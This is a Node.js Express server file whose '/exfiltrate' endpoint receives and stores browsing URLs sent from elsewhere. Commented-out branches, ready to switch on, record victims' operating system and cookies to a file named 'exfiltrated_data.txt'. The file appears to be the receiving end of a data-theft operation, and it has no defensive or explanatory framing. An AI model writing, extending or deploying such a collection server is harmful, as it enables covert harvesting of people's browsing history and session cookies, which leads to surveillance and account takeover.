const express = require('express');
const fs = require('fs');

const app = express();
const PORT = 3000;

app.use(express.json());

var links = new Array();

app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Dashboard</title>
    </head>
    <body>
      <h1>Welcome to the Dashboard!</h1>
      <p>This is the homepage of your server.</p>
    </body>
    </html>
  `);
});


app.post('/exfiltrate', (req, res) => {
    const { type, data } = req.body;
    if (!type || !data) {
        res.status(400).send('Bad Request: Missing type or data');
        return;
    }

    switch (type) {
        case 'urls':
            const url = data;
            console.log("Received URL:", url);
            links.push({
              url: url,
              receivedAt: new Date()
            });
            break;
//        case 'os':
//            console.log(`Received OS: ${data}`);
//            // Save OS to a file
//            fs.appendFileSync('exfiltrated_data.txt', `OS: ${data}\n\n`);
//            break;
//        case 'cookies':
//            console.log(`Received Cookies: ${data}`);
//            // Save Cookies to a file
//            fs.appendFileSync('exfiltrated_data.txt', `Cookies: ${data}\n\n`);
//            break;
//        default:
//            console.log(`Unknown type: ${type}`);
//            fs.appendFileSync('exfiltrated_data.txt', `Unknown Type: ${type}\n\n`);
//            break;
    }

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Server running on: http://localhost:${PORT}/`);
});
